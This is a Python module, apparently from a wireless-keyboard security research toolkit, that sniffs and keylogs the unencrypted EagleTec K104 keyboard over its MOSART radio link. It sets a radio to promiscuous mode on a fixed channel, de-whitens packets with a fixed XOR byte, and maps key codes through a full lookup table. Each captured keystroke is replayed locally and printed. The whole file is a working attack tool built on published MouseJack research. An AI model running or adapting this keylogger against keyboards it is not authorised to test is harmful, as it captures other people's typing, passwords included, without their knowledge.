"""
This file contains the functionalities required for keylogging the unencrypted EagleTec K104 keyboard,
which uses a MOSART transceiver rather than nRF24.
This implementation could theoretically support any MOSART-based product, as the MouseJack whitepaper states
that there is likely no vendor-specific customization.

References:
1. Section 8 (MOSART) in the MouseJack whitepaper
2. KeySniffer project: https://github.com/BastilleResearch/keysniffer/blob/master/tools/mosart-device-discovery.py
3. Slides 53-72 of the following presentation describe the reverse engineering process of a MOSART-based mouse:
   https://repo.zenk-security.com/Conferences/HITB/D1%20COMMSEC%20-%20Marc%20Newlin%20-%20Applying%20Regulatory%20Data%20to%20IoT%20RF%20Reverse%20Engineering.pdf
4. Mirage Framework documentation and relevant source code:
   https://homepages.laas.fr/rcayre/mirage-documentation/mosartstack.html
   https://github.com/RCayre/mirage/tree/master/mirage/libs/mosart_utils
"""

import time
from pynput.keyboard import Controller, Listener, Key, KeyCode
from ..hid_scan_codes import *
from ..general_utils import *

# constants
CHANNEL = 26 # the channel at which the keyboard and dongle camp (constantly remain on)
RF_RATE_1M = 1 # the data rate of the MOSART transceiver is 1Mbps (the value 1 is for another reason - it's the ordinal of this rate in the "enum" of data rates defined at nrf24.py)
POSTAMBLE = 0xFF # the last byte of a MOSART keypress packet
PACKET_LEN = 10 # expected length of a MOSART keypress packet, not including the preamble
WHITENING_BYTE = 0x5A # the fields are XOR-ed with this value before the packet is transmitted over the air by the keyboard
KEY_STATE_DOWN = 0x81
KEY_STATE_UP = 0x01
KEYPRESS_FRAME_TYPE = 0x07

message = "" # message printed to the screen when a key is pressed/released

# MOSART has its own unique keyboard codes. This dictionary maps them to values that are compatible with pynput.
# We need this because 
# Based on: https://github.com/RCayre/mirage/blob/master/mirage/libs/mosart_utils/keyboard_codes.py#L29, plus manual sniffing
eagletec_codes = {
    0x08: Key.pause,
    0x0C: Key.ctrl_r,
    0x0E: Key.ctrl_l,
    0x0F: Key.f5,
    0x10: 'q',
    0x11: Key.tab,
    0x12: 'a',
    0x13: Key.esc,
    0x14: 'z',
    0x16: '`',
    0x17: '1',
    0x18: 'w',
    0x19: Key.caps_lock,
    0x1A: 's',
    0x1C: 'x',
    0x1E: Key.f1,
    0x1F: '2',
    0x20: 'e',
    0x21: Key.f3,
    0x22: 'd',
    0x23: Key.f4,
    0x24: 'c',
    0x26: Key.f2,
    0x27: '3',
    0x28: 'r',
    0x29: 't',
    0x2A: 'f',
    0x2B: 'g',
    0x2C: 'v',
    0x2D: 'b',
    0x2E: '5',
    0x2F: '4',
    0x30: 'u',
    0x31: 'y',
    0x32: 'j',
    0x33: 'h',
    0x34: 'm',
    0x35: 'n',
    0x36: '6',
    0x37: '7',
    0x38: 'i',
    0x39: ']',
    0x3A: 'k',
    0x3B: Key.f6,
    0x3C: ',',
    0x3E: '=',
    0x3F: '8',
    0x40: 'o',
    0x41: Key.f7,
    0x42: 'l',
    0x44: '.',
    0x45: Key.menu,
    0x46: Key.f8,
    0x47: '9',
    0x48: 'p',
    0x49: '[',
    0x4A: ';',
    0x4B: "'",
    0x4D: '/',
    0x4E: '-',
    0x4F: '0',
    0x50: Key.scroll_lock,
    0x53: Key.alt_l,
    0x55: Key.alt_r,
    0x57: Key.print_screen,
    0x59: Key.backspace,
    0x5A: '\\',
    0x5B: Key.f11,
    0x5C: Key.enter,
    0x5D: Key.f12,
    0x5E: Key.f9,
    0x5F: Key.f10,
    0x60: VK_NUMPAD7,
    0x61: VK_NUMPAD4,
    0x62: VK_NUMPAD1,
    0x63: Key.space,
    0x64: Key.num_lock,
    0x65: Key.down,
    0x66: Key.delete,
    0x68: VK_NUMPAD8,
    0x69: VK_NUMPAD5,
    0x6A: VK_NUMPAD2,
    0x6B: VK_NUMPAD0,
    0x6C: VK_DIVIDE,
    0x6D: Key.right,
    0x6E: Key.insert,
    0x70: VK_NUMPAD9,
    0x71: VK_NUMPAD6,
    0x72: VK_NUMPAD3,
    0x73: VK_DECIMAL,
    0x74: VK_MULTIPLY,
    0x75: VK_SUBTRACT,
    0x76: Key.page_up,
    0x77: Key.page_down,
    0x78: VK_ADD,
    0x7A: Key.enter, # Keypad ENTER
    0x7B: Key.up,
    0x7D: Key.left,
    0x7E: Key.home,
    0x7F: Key.end,
    0x81: Key.shift_l,
    0x82: Key.shift_r,
    0x89: Key.cmd_l,
    0x92: Key.cmd_r,
}

def get_key_name(key): # key is a Key/KeyCode object of pynput.keyboard
    try:
        if key.char: # if the key is a character, simply return it
            return key.char
        
        # Handling keypad keys, which are defined using KeyCode objects. We have a dedicated dictionary to get their names,
        # but we can't use the "key" parameter to directly access the dictionary, since it holds a different KeyCode reference than the one stored there.
        # So we iterate over the dictionary until we find a KeyCode with the same vk.
        for k in list(pynput_dict.keys()):
            if isinstance(k, KeyCode) and key.vk == k.vk:
                return pynput_dict[k]
    except AttributeError: # if the key doesn't have a "char" attribute, then it's a Key object (KeyCode objects do have a "char" attribute)
        return pynput_dict[key] # this time we can directly access the dictionary, since Key objects are simply enum values

# function called when the listener catches a key press (performed by the controller, in this case)
def on_press(key):
    global message
    if message:
        print(message + f"    key {get_key_name(key)} pressed") # print the message along with the identified key
    message = "" # so that no message is printed if the user on this PC presses a key (which is caught by the listener)

# function called when the listener catches a key release (performed by the controller, in this case)
def on_release(key):
    global message
    if message:
        print(message + f"    key {get_key_name(key)} released")
    message = ""

def sniff(radio, address, duration):
    """
    This function receives a radio parameter (can either be a RadioServer for remote communication, or nrf24 for local usage),
    the duration of the sniffing proccess (in seconds), and the known address of an EagleTec keyboard.
    It performs sniffing and keylogging of the EagleTec K104 keyboard - printing received packets and identified key for each packet.
    """
    global message
    address_prefix = address[::-1] # we get the address in little endian like usually required, but here it needs to be big endian 
    radio.enter_promiscuous_mode_generic(address_prefix, RF_RATE_1M)
    radio.set_channel(CHANNEL)

    start_time = time.time() # variable to store the time in which the sniffing process has started

    # Initializing a 
    keyboard = Controller()
    listener = Listener(on_press=on_press, on_release=on_release)
    listener.start()

    while time.time() - start_time < duration: # repeating as long as the time passed since the beginning of the sniffing process has not exceeded the desired duration
        value = radio.receive_payload() # try to receive a payload
        if value[0] == 0xFF: # 0xFF means no payload, according to the research firmware code: https://github.com/BastilleResearch/nrf-research-firmware/blob/master/src/radio.c#L365
            continue

        if POSTAMBLE in value and value.index(POSTAMBLE) == PACKET_LEN - 1:
            value = value[:PACKET_LEN]
            frame_type = (value[4] ^ WHITENING_BYTE) >> 4
            key_state = value[5] ^ WHITENING_BYTE
            key_code = value[6] ^ WHITENING_BYTE

            if (key_code ^ WHITENING_BYTE == 0x95) or (key_code not in eagletec_codes.keys()) or (frame_type != KEYPRESS_FRAME_TYPE):
                continue
            
            message = f"address: {format_bytes(address_prefix)}    packet: AA:AA:{format_bytes(value):<20}"
            pressed_key = eagletec_codes[key_code]
            if key_state == KEY_STATE_DOWN:
                keyboard.press(pressed_key)
            elif key_state == KEY_STATE_UP:
                keyboard.release(pressed_key)

    listener.stop()
    for modifier in pynput_modifiers:
        keyboard.release(modifier)
